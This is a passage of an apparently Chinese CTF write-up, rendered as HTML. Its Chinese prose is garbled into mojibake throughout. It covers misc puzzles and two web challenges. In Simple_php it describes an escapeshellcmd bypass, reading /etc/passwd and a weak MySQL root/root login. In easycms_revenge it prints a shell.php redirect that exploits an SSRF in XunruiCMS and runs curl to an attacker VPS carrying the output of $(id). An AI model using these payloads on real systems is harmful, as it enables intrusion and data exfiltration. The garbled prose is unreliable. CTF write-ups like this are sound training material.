class="built_in">print</span>(array)</span><br></pre></td></tr></table></figure><p>é€šè¿‡inputã€indexã€traceçš„å†…å®¹å¯ä»¥åˆ†æå‡ºï¼Œå®ƒâ¼¤æ¦‚æœ‰13ç»„æ•°æ®æ¯ç»„æ•°æ®å¯¹åº”â¼€å¹…å›¾ï¼Œæœ‰ç‚¹ç±»ä¼¼é”®ç›˜æ•²å‡»çš„</p><p>åˆ†æè¯»å–çš„ä¸‰ç»„æ•°æ®ï¼Œå‘ç°å¯¹åº”æ˜¯13ç»„å›¾ï¼Œæ¯ç»„æ•°æ®å¯¹åº”ä¸€ä¸ªæœ€ä½ç‚¹ï¼Œå†æ‹·æ‰“gptå†™ä¸ªè¯»å–çš„æœ€å°å€¼ä¸­çš„æœ€å¤§å€¼</p><ul><li>exp</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ è½½ .npz æ–‡ä»¶ä¸­çš„æ•°æ®</span></span><br><span class="line">data = np.load(<span class="string">&quot;attachment.npz&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä» .npz æ–‡ä»¶ä¸­æå– &#x27;index&#x27;, &#x27;trace&#x27;, å’Œ &#x27;input&#x27; æ•°ç»„</span></span><br><span class="line">index = data[<span class="string">&#x27;index&#x27;</span>]</span><br><span class="line">trace = data[<span class="string">&#x27;trace&#x27;</span>]</span><br><span class="line">input_data = data[<span class="string">&#x27;input&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆå§‹åŒ–ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ï¼Œç”¨äºå­˜å‚¨ç»“æœ</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># éå†èŒƒå›´ 12ï¼Œå¤„ç† input_data çš„æ¯ä¸€ä¸ª 40 è¡Œå—</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    <span class="comment"># è·å–å½“å‰å—çš„ 40 è¡Œæ•°æ®</span></span><br><span class="line">    table = input_data[<span class="number">40</span> * i: <span class="number">40</span> * (i + <span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¯¹äºæ¯ä¸€è¡Œï¼ˆå…± 40 è¡Œï¼‰ï¼Œæ‰¾åˆ° trace ä¸­æ¯ä¸€è¡Œçš„æœ€å°å€¼çš„ç´¢å¼•</span></span><br><span class="line">    min_indices = [np.argmin(trace[i * <span class="number">40</span> + j]) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ‰¾åˆ°ä¸Šä¸€æ­¥è®¡ç®—çš„æœ€å°å€¼ç´¢å¼•ä¸­çš„æœ€å¤§å€¼ç´¢å¼•</span></span><br><span class="line">    max_min_index = np.argmax(min_indices)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å°†è¡¨æ ¼ä¸­å¯¹åº”äºæœ€å¤§æœ€å°å€¼ç´¢å¼•çš„å€¼æ·»åŠ åˆ°ç»“æœå­—ç¬¦ä¸²ä¸­</span></span><br><span class="line">    result += table[max_min_index]</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å°æœ€ç»ˆçš„ç»“æœå­—ç¬¦ä¸²ï¼Œä¸æ·»åŠ é¢å¤–çš„æ¢è¡Œç¬¦</span></span><br><span class="line"><span class="built_in">print</span>(result, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519181709916-367513063.png" alt="image-20240519181705080"></p><h2 id="é€šé£æœº"><a href="#é€šé£æœº" class="headerlink" title="é€šé£æœº"></a>é€šé£æœº</h2><p>ç™¾åº¦æœmwpæ–‡ä»¶å’‹æ‰“å¼€</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519153954328-756953515.png" alt="image-20240519153949675"></p><p>æ”¾è¿›å»å‘ç°æç¤ºä¸è¯†åˆ«ï¼Œç”¨010æ‰“å¼€åä»¥åŠæŸ¥çœ‹è¯¥æ–‡ä»¶å¤´å‘ç°æ–‡ä»¶å¤´ç¼ºå¤±</p><p>å…ˆè¡¥å…¨æ–‡ä»¶å¤´</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519153511943-1559805537.png" alt="image-20240519153507379"></p><p>ç”¨stepå·¥å…·æ‰“å¼€</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519153636844-961689750.png" alt="image-20240519153632511"></p><p>base64è§£ç </p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519153717629-1532464494.png" alt="image-20240519153712979"></p><h2 id="ç¥ç§˜æ–‡ä»¶"><a href="#ç¥ç§˜æ–‡ä»¶" class="headerlink" title="ç¥ç§˜æ–‡ä»¶"></a>ç¥ç§˜æ–‡ä»¶</h2><p>å°†pptæ–‡ä»¶è½¬æ¢ä¸ºzipï¼Œæ–‡æ¡£æ‰“å¼€æ‰¾åˆ°ï¼Œpptä¿¡æ¯é‡Œé¢ä¹Ÿå¯ä»¥æ‰¾åˆ°ï¼Œæ‡’å¾—æˆªå›¾äº†<br>Part1:flag{e<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716106492580-26b1e005-7512-42d9-a272-151cd3f43b17.png#averageHue=%23231f1e&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=107&amp;id=u5940995a&amp;originHeight=167&amp;originWidth=803&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=14388&amp;status=done&amp;style=none&amp;taskId=uce27be34-720a-466e-855c-1aaa1b5ff9e&amp;title=&amp;width=513.92" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716107572564-18f01d74-a502-40d8-af18-9f2c23c4d3a4.png#averageHue=%23f6f2f1&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=415&amp;id=uf3912ae0&amp;originHeight=648&amp;originWidth=526&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=57053&amp;status=done&amp;style=none&amp;taskId=u6d2eea5d-5e52-47cf-bbcc-16d3b7e2d6c&amp;title=&amp;width=336.64" alt="image.png"><br>ï¼ˆç®—äº†è¿˜æ˜¯æˆªäº†ï¼‰<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716107764486-62638e04-f9c4-4218-9de0-f56184826389.png#averageHue=%23fdfdfc&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=489&amp;id=ucc0600eb&amp;originHeight=764&amp;originWidth=1137&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=27692&amp;status=done&amp;style=none&amp;taskId=u0973da23-49da-459c-b2e5-9f912fa6356&amp;title=&amp;width=727.68" alt="image.png"><br>è§£å¯†<br>part2:675efb<br>é‡Œé¢æœ‰ä¸ªwordï¼Œææˆzipè§£å‹<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716107925246-fe0a3e99-3fbd-4c65-9069-b3e0db9b6c6d.png#averageHue=%23221e1d&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=92&amp;id=ub31f8e2b&amp;originHeight=143&amp;originWidth=1631&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=33181&amp;status=done&amp;style=none&amp;taskId=ud19d7846-698c-466e-905f-285365225ec&amp;title=&amp;width=1043.84" alt="image.png"><br>æ¥ç€å‡¯æ’’çˆ†ç ´base64<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716108031213-a6565110-6e74-4b6b-870b-4b311fdba2f9.png#averageHue=%23fcfcfb&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=602&amp;id=u57a3cf8a&amp;originHeight=940&amp;originWidth=2031&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=137352&amp;status=done&amp;style=none&amp;taskId=u7f8b762d-752c-478d-af51-e38d0ad79d0&amp;title=&amp;width=1299.84" alt="image.png"><br>PArt3:3-34<br>alt+F11æ‰“å¼€vbaä»£ç <br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716108094760-e1590f14-1867-4228-8b08-26a43e592d5e.png#averageHue=%23fbfafa&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=401&amp;id=uc697dce8&amp;originHeight=627&amp;originWidth=826&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=36385&amp;status=done&amp;style=none&amp;taskId=ud3bae096-4853-4fa3-aced-d140a3df981&amp;title=&amp;width=528.64" alt="image.png"><br>é—®gptæ˜¯RC4ï¼ˆä¸€ç›´ä»¥ä¸ºè¦å†™è§£å¯†è„šæœ¬ï¼ï¼ï¼ï¼‰<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716108192751-d5e40af9-9475-41b2-9ddc-31427c36089b.png#averageHue=%23fdfdfd&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=502&amp;id=u8511315e&amp;originHeight=784&amp;originWidth=1288&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=32467&amp;status=done&amp;style=none&amp;taskId=u06617092-6b36-4c14-8f71-921c66983e4&amp;title=&amp;width=824.32" alt="image.png"><br>Payt4:6f-40<br>PPTç»™å›¾ç‰‡æ€å¼€<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716108300557-25e6cd01-2729-47c5-9490-c04ef5a82deb.png#averageHue=%23fdf6d7&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=163&amp;id=u97438b20&amp;originHeight=254&amp;originWidth=1811&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=30298&amp;status=done&amp;style=none&amp;taskId=uf87699d3-5c7a-47d7-8d40-acd93b08f19&amp;title=&amp;width=1159.04" alt="image.png"><br>base64è§£å¯†<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716108384838-aa51d603-310f-4674-8b7f-5c29dec629ac.png#averageHue=%23fdfdfd&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=543&amp;id=u6c0e38ba&amp;originHeight=849&amp;originWidth=1262&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=23497&amp;status=done&amp;style=none&amp;taskId=u7247c690-186d-4958-ba7c-b20389589ab&amp;title=&amp;width=807.68" alt="image.png"><br>pArt5:5f-90d<br>ç¬¬äº”é¡µppt<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716108414303-ed12dfe7-8dfb-43f3-a604-53a7faa1c689.png#averageHue=%23565557&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=58&amp;id=u3d2f6a84&amp;originHeight=90&amp;originWidth=1352&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=21813&amp;status=done&amp;style=none&amp;taskId=u14d60f67-5708-4b5b-b65e-5ae19d3974d&amp;title=&amp;width=865.28" alt="image.png"><br>å¤šè½®base64è§£å¯†<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716108449233-8834d997-0c5b-4849-a675-1bb86e310e60.png#averageHue=%23fdfcfc&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=622&amp;id=SmmWX&amp;originHeight=972&amp;originWidth=1875&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=89549&amp;status=done&amp;style=none&amp;taskId=uca9840a1-c886-4d57-84cf-be608273c3d&amp;title=&amp;width=1200" alt="image.png"><br>ParT6:d-2<br>è¿˜æ˜¯æ”¹ä¸ºzipè§£å‹å‡ºæ¥çš„é¢˜ç›®é‡Œæ‰¾åˆ°çš„<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716108629143-0d7aab51-366f-40f3-9ac2-efc31576b3bc.png#averageHue=%23faf8f4&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=127&amp;id=u0408805e&amp;originHeight=199&amp;originWidth=988&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=31790&amp;status=done&amp;style=none&amp;taskId=ue6de49b7-7f91-4c08-aaa3-8bec3371696&amp;title=&amp;width=632.32" alt="image.png"><br>base64<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716108642560-2fe27b40-d301-4b10-ac41-6d019d8c9fc8.png#averageHue=%23fcfcfc&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=522&amp;id=u84753e12&amp;originHeight=816&amp;originWidth=1090&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=22549&amp;status=done&amp;style=none&amp;taskId=u849dbd9d-f7a4-4268-ad9a-c5235e6d564&amp;title=&amp;width=697.6" alt="image.png"><br>PART7=22b3<br>åœ¨<code>ppt/slides/slide4.xml</code>ä¸‹<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716108872948-8899a2b1-85d3-44ae-b15a-f932c3e3b90f.png#averageHue=%23231f1e&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=139&amp;id=u6e596ae0&amp;originHeight=217&amp;originWidth=951&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=32228&amp;status=done&amp;style=none&amp;taskId=u534bd39b-43e1-43b3-86dd-0702857c16c&amp;title=&amp;width=608.64" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716109032598-2b029db2-3a2b-4d7b-9616-1b58cd646e07.png#averageHue=%232c2821&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=40&amp;id=u8084d926&amp;originHeight=63&amp;originWidth=256&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=2843&amp;status=done&amp;style=none&amp;taskId=uf3f426e4-c5a1-41d0-b24f-8f1411abee3&amp;title=&amp;width=163.84" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716108989806-a7901a7e-b2f9-4b98-8e07-1f3dc64b0933.png#averageHue=%23fcfcfc&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=484&amp;id=u995f9a43&amp;originHeight=757&amp;originWidth=1097&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=34671&amp;status=done&amp;style=none&amp;taskId=ud97e144d-73ae-41b0-97fe-9354f2045e4&amp;title=&amp;width=702.08" alt="image.png"><br>paRt8:87e<br> <code>ppt\slideLayouts\slideLayout2.xml</code>ä¸‹</p><p><img src="C:/Users/lemon/AppData/Roaming/Typora/typora-user-images/image-20240607161240682.png" alt="CNJBO9M$}2G(BF4_OT{PM`M.png"><br>å¯çŸ¥å¯†æ–‡å»æ‰Bb13è§£base64</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607161420805-219422224.png" alt="image-20240607161418562"></p><p> paRt8:87e</p><p>åœ¨<code>ppt\media</code>ä¸‹<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716109359865-6a66e95f-4841-419d-834f-82d27db8a1b6.png#averageHue=%23736b67&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=435&amp;id=u005cc4f5&amp;originHeight=679&amp;originWidth=926&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=208387&amp;status=done&amp;style=none&amp;taskId=u7039193f-1dae-4917-a058-6c043e2ed1e&amp;title=&amp;width=592.64" alt="image.png"><br>è§£å¯†<br><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607161506857-1018305141.png" alt="image-20240607161504364"><br>PARt10:9}<br>ç»´å‰å°¼äºš keyä¹Ÿæœ‰<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1716109807249-dfa68f6f-b9b1-428a-987a-d0dcfc97440b.png#averageHue=%235d5957&amp;clientId=u841a304f-0106-4&amp;from=paste&amp;height=358&amp;id=u86103ed2&amp;originHeight=560&amp;originWidth=296&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=20380&amp;status=done&amp;style=none&amp;taskId=u5a9174d4-d5fd-4a9c-b841-dec50ca2811&amp;title=&amp;width=189.44" alt="image.png"></p><p>å¯†æ–‡ZYWJbIYnFhq9ï¼ŒåŠ å¯†æ–¹å¼æ˜¯ç»´å‰å°¼äºšåŠ å¯†ï¼Œ å¯†é’¥furry</p><h2 id="Tough-DNS"><a href="#Tough-DNS" class="headerlink" title="Tough_DNS"></a>Tough_DNS</h2><p>é¢˜ç›®æè¿°æ˜¯ä¸€ä¸²16è¿›åˆ¶æ•°æ®ï¼Œè§£ç </p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519164112092-139304058.png" alt="image-20240519164104332"></p><p>æ²¡è§£å¼€ï¼Œå°è¯•é€šè¿‡é€†åºåœ¨è¿›è¡Œ16è¿›åˆ¶è§£ç å†é€†åºå›æ¥å¾—åˆ°æ­£å¸¸çš„æ•°æ®</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607162353150-139741468.png" alt="image-20240607162350498"></p><p>åœ¨æµé‡åŒ…ä¸­å‘ç°äºŒè¿›åˆ¶åŸŸå</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519164505210-2099247586.png" alt="image-20240519164500340"></p><p>åˆ©ç”¨å·¥å…·å°†åŸŸåæå–åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œå°†å…¶ä¿å­˜</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111111101100101111111111111101100101111111111111101100101111111111111101100101111111100000100100101000001100000100100101000001100000100100101000001100000100100101000001101110101010101011101101110101010101011101101110101010101011101101110101010101011101101110101001001011101101110101001001011101101110101001001011101101110101001001011101101110101110001011101101110101110001011101101110101110001011101101110101110001011101100000100000001000001100000100000001000001100000100000001000001100000100000001000001111111101010101111111111111101010101111111111111101010101111111111111101010101111111000000000110000000000000000000110000000000000000000110000000000000000000110000000000111100101010010011101111100101010010011101111100101010010011101111100101010010011101010010000010110111111010010000010110111111010010000010110111111010010000010110111111011001111000101100001011001111000101100001011001111000101100001011001111000101100001001110000110100001000001110000110100001000001110000110100001000001110000110100001000000101111001001100000000101111001001100000000101111001001100000000101111001001100000000000001111001110010000000001111001110010000000001111001110010000000001111001110010111111100100011010110111111100100011010110111111100100011010110111111100100011010110100000100011010000100100000100011010000100100000100011010000100100000100011010000100101110100001000010110101110100001000010110101110100001000010110101110100001000010110101110101110110100110101110101110110100110101110101110110100110101110101110110100110101110101011110101100101110101011110101100101110101011110101100101110101011110101100100000101110001111001100000101110001111001100000101110001111001100000101110001111001111111101111001111100111111101111001111100111111101111001111100111111101111001111100</span><br></pre></td></tr></table></figure><p>å°è¯•åï¼Œå‘ç°å¯èƒ½æ˜¯äºŒç»´ç ï¼Œåˆ©ç”¨å·¥å…·å°†å…¶è½¬æ¢æˆäºŒç»´ç </p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607171710886-1959652525.png" alt="image-20240607171708632"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607171654722-1330033081.png" alt="image-20240607171652269"></p><p>æ‰«æå‡ºæ¥çš„ç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519175734479-2049718795.png" alt="image-20240519175729877"></p><p>é€šè¿‡åˆ†æåç»­æµé‡ï¼Œåˆ©ç”¨ tshark è„šæœ¬åˆ†åˆ«å¯¼å‡º 0x6421ï¼Œ0x4500 æ‰€å¯¹åº”çš„æ•°æ®</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607172537896-665304996.png" alt="image-20240607172534679"></p><p>åˆ©ç”¨å‘½ä»¤åˆ†åˆ«æå–æ•°æ®</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607182520917-1525444214.png" alt="image-20240607182517591"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607182547664-1913152725.png" alt="image-20240607182544589"></p><p>åˆ©ç”¨åœ¨çº¿å°†å…¶è½¬æ¢æˆæ–‡ä»¶</p><ul><li>0x4500æ–‡ä»¶ï¼Œæ˜¯ä¸€ä¸ªå‹ç¼©åŒ…</li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607182800749-1063011295.png" alt="image-20240607182758675"></p><p>å‘ç°æ˜¯ä¸€ä¸ªå¸¦é”çš„gpgæ–‡ä»¶ï¼Œå°†å‹ç¼©åŒ…ç»™åä¸º1.zip</p><ul><li>0x6421æ˜¯ä¸€ä¸ªpgpæ–‡ä»¶</li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607183022938-979978696.png" alt="image-20240607183020136"></p><p>å°†æ–‡ä»¶ç»™åä¸º2.pgp</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607183256747-1459349315.png" alt="image-20240607183254268"></p><p>æå–gpgæ–‡ä»¶å‘ç°éœ€è¦å¯†ç ï¼Œç»“åˆé¢˜ç›®ï¼Œè¾“å…¥å¯†ç 15f9792dba5cï¼Œæ‹¿åˆ°gpgæ–‡ä»¶</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607183431208-686758359.png" alt="image-20240607183428870"></p><p>åˆ©ç”¨PGPToolå·¥å…·è¿›è¡Œè§£å¯†</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607185345779-1261008817.png" alt="image-20240607185342884"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607185418567-2134737422.png" alt="image-20240607185416426"></p><p>å¯†ç ä¸ºæœ€å¼€å§‹æ ¹æ®é¢˜ç›®æè¿°å¾—åˆ°çš„æ•°æ®ï¼Œe9b0-ea5f9baeè¿™ä¸ªé¢è†œä¸å¯¹ï¼Œæµ‹è¯•åå‘ç°è¿˜éœ€è¦å†é€†åºä¸€ä¸‹æ‰è¡Œ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607185958858-329278782.png" alt="image-20240607185956491"></p><p>æ‹¿åˆ°flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190113553-606034123.png" alt="image-20240607190111445"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Simple-php"><a href="#Simple-php" class="headerlink" title="Simple_php"></a>Simple_php</h2><p>æµ‹è¯•å‘ç°èƒ½å¤Ÿæ‰§è¡Œ<code>php -v</code>å‘½ä»¤</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518132251631-1490700329.png" alt="image-20240518132248207"></p><p>å› ä¸ºå­˜åœ¨è¿‡æ»¤ä»¥åŠç‰¹æ®Šå‡½æ•°<code>escapeshellcmd</code>ï¼Œå¯¼è‡´å‘½ä»¤ä¸èƒ½æ­£å¸¸æ‰§è¡Œï¼Œå¯ä»¥æ„é€ åå…­è¿›åˆ¶æ•°æ®ç»“åˆ<code>php -r</code>è¿›è¡Œç»•è¿‡</p><p><a href="https://lzltool.cn/Toolkit/ConvertStringToHexadecimal">åœ¨çº¿å­—ç¬¦ä¸²/åå…­è¿›åˆ¶äº’ç›¸è½¬æ¢â€”LZLåœ¨çº¿å·¥å…· (lzltool.cn)</a></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518132828898-898802066.png" alt="image-20240518132825429"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607112312423-1255600154.png" alt="image-20240518134217969"></p><p>æµ‹è¯•åå‘ç°æ ¹ç›®å½•æ²¡æœ‰flagï¼Œåˆ©ç”¨<code>php</code>è¯»<code>/etc/passwd</code>æ–‡ä»¶</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518132332745-1157496133.png" alt="image-20240518132329161"></p><p>å‘ç°MysqlæœåŠ¡ï¼Œæ ¹æ®rootç”¨æˆ·çš„è´¦æˆ·åå’Œå¯†ç ï¼Œå¼±å£ä»¤å°è¯•ç™»é™†root/root</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518133750180-701643652.png" alt="image-20240518133746619"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518134922083-1666679704.png" alt="image-20240518134917547"></p><p>è¿æ¥æˆåŠŸï¼Œè¿›å…¥PHP_CMSæ•°æ®åº“ï¼Œå†æŸ¥è¯¢è¡¨</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518133916900-1553976194.png" alt="image-20240518133913511"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518134838056-1875913792.png" alt="image-20240518134834000"></p><p>ç»§ç»­æŸ¥æ•°æ®</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518134413609-938358665.png" alt="image-20240518134410050"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240518134735151-1797594180.png" alt="image-20240518134731217"></p><h2 id="easycms-revenge"><a href="#easycms-revenge" class="headerlink" title="easycms_revenge"></a>easycms_revenge</h2><p>æ ¹æ®ç¬¬ä¸€å¤©çš„flagå†…å®¹æç¤ºéœ€è¦ä¼ªé€ â€REMOTE_ADDRâ€ï¼Œä½†æ˜¯è¿™ä¸ªä¸å¯ä¼ªé€ ï¼Œéœ€è¦é€šè¿‡ssrfæ¥æ‰“ï¼Œé€šè¿‡ç½‘ä¸Šæœç´¢å‘ç°è¯¥cmså­˜åœ¨qrcode+ssrfæ¼æ´</p><p><a href="https://www.xunruicms.com/bug/">https://www.xunruicms.com/bug/</a></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519112818817-518530127.png" alt="image-20240519112814457"></p><p>githubæºç å®¡è®¡æ‰¾åˆ°qrcodeå‡½æ•°</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519112627631-54222019.png" alt="image-20240519112621674"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519150556186-876744862.png" alt="image-20240519150551391"></p><p><a href="https://www.xunruicms.com/doc/444.html">https://www.xunruicms.com/doc/444.html</a></p><p>æŸ¥è¯¢æ–‡æ¡£å‘ç°å‚æ•°å¯æ§ï¼Œå¯ä»¥é€šè¿‡æ„é€ urlæ¥è¿›è¡ŒSSRFä¼ªé€ è¿›è¡Œå¤–å¸¦ï¼Œä½†æ˜¯éœ€è¦æ˜¯ä¸€å¼ <strong>å›¾ç‰‡</strong>èƒ½å¤Ÿä½¿å…¶è¯†åˆ«</p><p>åœ¨è‡ªå·±çš„vpsä¸Šå†™ä¸ªæ–‡ä»¶<code>shell.php</code>ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define width 8888</span></span><br><span class="line"><span class="comment">#define height 8888</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:http://127.0.0.1/flag.php?cmd=curl http://vpsip:port/?id=$(id)&quot;</span>);</span><br></pre></td></tr></table></figure><p>å¤§æ¦‚æ„æ€å°±æ˜¯é€šè¿‡å®šä¹‰å®½é«˜æ¥ä½¿å…¶æˆä¸ºä¸€å¼ å›¾ç‰‡ï¼Œç»•è¿‡æ£€æµ‹ï¼Œå†åˆ©ç”¨302è·³è½¬æ‰“SSRF</p><p>æœ¬åœ°èµ·ä¸€ä¸ªpythonæœåŠ¡ç”¨æ¥ç›‘å¬</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519113448411-499464643.png" alt="image-20240519113443683"></p><p>è®¿é—®é¢˜ç›®ï¼š</p><p><code>url/index.php?s=api&amp;c=api&amp;m=qrcode&amp;size=100&amp;level=10&amp;thumb=http://vpsip/shell.php&amp;text=1</code></p><p>æ‰§è¡Œå‘½ä»¤æˆåŠŸï¼Œåˆ©ç”¨<code>ls /|sed -n 1p</code>æŸ¥çœ‹</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519113835586-899329325.png" alt="image-20240519113830661">å‘ç°flagæ— æ³•è¯»å–ï¼Œç»§ç»­éå†ç›®å½•å‘ç°<code>readflag</code>å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¾“å‡ºreadflagæ‰§è¡Œç»“æœæ‹¿åˆ°flag</p><figure 